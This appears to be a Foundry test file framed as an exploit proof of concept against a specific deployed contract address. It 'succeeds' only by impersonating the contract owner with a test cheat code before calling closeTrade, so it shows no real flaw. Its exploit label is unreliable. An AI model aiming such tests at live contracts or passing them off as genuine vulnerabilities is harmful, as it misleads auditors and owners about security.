pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IINCOME {
    function owner() external view returns (address);
    function closeTrade() external;
    function isOpen() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address contractOwner = IINCOME(TARGET).owner();
        vm.startPrank(contractOwner);
        IINCOME(TARGET).closeTrade();
        vm.stopPrank();
        assertEq(IINCOME(TARGET).isOpen(), false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
